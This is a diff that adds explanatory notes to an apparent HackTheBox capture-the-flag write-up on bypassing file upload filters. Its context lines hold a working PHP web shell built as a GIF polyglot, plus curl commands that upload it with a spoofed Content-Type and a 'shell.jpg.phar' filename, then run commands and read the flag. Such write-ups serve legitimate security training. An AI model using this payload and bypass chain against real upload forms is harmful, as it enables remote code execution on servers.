@@ -22,6 +22,7 @@ curl -X POST "http://TARGET/upload.php" \
   -F "uploadFile=@shell.php;type=image/jpeg"
 # The ";type=..." sets the Content-Type for THIS file part
 ```
+> Overrides the Content-Type header for the uploaded file part. The server's Content-Type check sees `image/jpeg` instead of `application/x-php`, so it passes validation.
 
 In Burp: edit the `Content-Type: application/x-php` line below `filename=...` to `Content-Type: image/jpeg`.
 
@@ -42,6 +43,7 @@ echo "GIF8" > x.jpg
 file x.jpg
 # → x.jpg: GIF image data  ✅ MIME = image/gif
 ```
+> Shows how MIME type detection is based on file content, not the extension. `file` inspects the first bytes to determine the real type.
 
 The fix: prepend image magic bytes to your PHP payload. PHP parses anything between `<?php ... ?>` and ignores the rest:
 
@@ -50,6 +52,7 @@ printf 'GIF8<?php system($_REQUEST["cmd"]); ?>' > poly.jpg
 file poly.jpg
 # → poly.jpg: GIF image data
 ```
+> Creates a polyglot file. The GIF8 magic bytes fool the MIME checker. PHP ignores the header and executes the code in `<?php ... ?>`.
 
 ### Common magic bytes
 
@@ -77,6 +80,7 @@ printf 'GIF8<?php system($_REQUEST["cmd"]); ?>' > poly.jpg
 curl -X POST "http://TARGET/upload.php" \
   -F "uploadFile=@poly.jpg;filename=shell.jpg.phar;type=image/jpeg"
 ```
+> The all-in-one bypass. The polyglot file passes the MIME check. The `type=image/jpeg` header passes the Content-Type check. The `shell.jpg.phar` filename passes both the whitelist and gets executed by Apache's PHP handler.
 
 Each layer:
 | Filter | How payload bypasses |
@@ -125,6 +129,7 @@ printf 'GIF8<?php system($_REQUEST["cmd"]); ?>' > /tmp/poly.jpg
 file /tmp/poly.jpg
 # → poly.jpg: GIF image data
 ```
+> The `printf` command writes the GIF magic bytes followed immediately by the PHP payload. The `file` command confirms it reads as image/gif.
 
 ### Step 2 — Upload with the chained-extension trick
 ```bash
@@ -132,6 +137,7 @@ curl -sk -X POST "http://154.57.164.76:31819/upload.php" \
   -F "uploadFile=@/tmp/poly.jpg;filename=shell.jpg.phar;type=image/jpeg"
 # → File successfully uploaded
 ```
+> Sends the polyglot with a crafted filename and Content-Type header. All five filter layers pass simultaneously.
 
 ### Step 3 — Confirm execution + read flag
 ```bash
@@ -141,6 +147,7 @@ curl -sk "http://154.57.164.76:31819/profile_images/shell.jpg.phar?cmd=id"
 curl -sk "http://154.57.164.76:31819/profile_images/shell.jpg.phar?cmd=cat+/flag.txt"
 # → GIF8 HTB{m461c4l_c0n73n7_3xpl0174710n}
 ```
+> The `GIF8` prefix in the output is the literal magic bytes at the start of the polyglot file. The PHP output follows immediately after.
 
 **Flag:** `HTB{m461c4l_c0n73n7_3xpl0174710n}`
 
